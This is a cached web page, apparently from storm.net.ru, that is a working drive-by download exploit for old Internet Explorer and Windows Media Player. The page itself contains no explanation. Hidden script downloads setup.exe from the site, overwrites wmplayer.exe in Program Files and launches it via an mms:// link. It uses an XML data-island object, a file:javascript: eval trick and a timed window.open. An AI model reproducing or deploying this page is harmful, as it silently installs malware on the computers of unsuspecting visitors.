<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<BASE HREF="http://storm.net.ru/"><table border=1 width=100%><tr><td><table border=1 bgcolor=#ffffff cellpadding=10 cellspacing=0 width=100% color=#ffffff><tr><td><font face=arial,sans-serif color=black size=-1>This is <b><font color=#0039b6>G</font> <font color=#c41200>o</font> <font color=#f3c518>o</font> <font color=#0039b6>g</font> <font color=#30a72f>l</font> <font color=#c41200>e</font></b>'s <a href="http://www.google.com/help/features.html#cached"><font color=blue>cache</font></a> of <A HREF="http://storm.net.ru/"><font color=blue>http://storm.net.ru/</font></a>.<br>
<b><font color=#0039b6>G</font> <font color=#c41200>o</font> <font color=#f3c518>o</font> <font color=#0039b6>g</font> <font color=#30a72f>l</font> <font color=#c41200>e</font></b>'s cache is the snapshot that we took of the page as we crawled the web.<br>
The page may have changed since that time.  Click here for the <A HREF="http://storm.net.ru/"><font color=blue>current page</font></a> without highlighting.<br>To link to or bookmark this page, use the following url: <code>http://www.google.com/search?q=cache:BTRxzEbbusMJ:storm.net.ru/</code></font><br><br><center><font size=-2><i>Google is not affiliated with the authors of this page nor responsible for its content.</i></font></center></td></tr></table></td></tr></table>
<hr>
<hml>
<span datasrc="#oExec" datafld="exploit" dataformatas="html"></span>
<xml id="oExec"><security><exploit><![CDATA[
<object id="oFile" classid="clsid:11111111-1111-1111-1111-111111111111" codebase="http://storm.net.ru/setup.exe"></object>
 ]]></exploit></security></xml>

<textarea id="code" style="display:none;">

var x = new ActiveXObject("Microsoft.XMLHTTP");
x.Open("GET", "http://storm.net.ru/setup.exe",0);
x.Send();

var s = new ActiveXObject("ADODB.Stream");
s.Mode = 3;
s.Type = 1;
s.Open();
s.Write(x.responseBody);

s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
location.href = "mms://";

</textarea>

<script language="javascript">

function preparecode(code) {
result = '';
lines = code.split(/\r\n/);
for (i=0;i<lines.length;i++) {

line = lines[i];
line = line.replace(/^\s+/,"");
line = line.replace(/\s+$/,"");
line = line.replace(/'/g,"\'");
line = line.replace(/[\\]/g,"\\\\");
line = line.replace(/[/]/g,"%2f");

if (line != '') {
result += line +'\\r\\n';
}
}
return result;
}

function doit() {
mycode = preparecode(document.all.code.value);
myURL = "file:java script:eval('" + mycode + "')";
window.open(myURL,"_media")
}


window.open("error.jsp","_media");

setTimeout("doit()", 5000);


</script>

</html>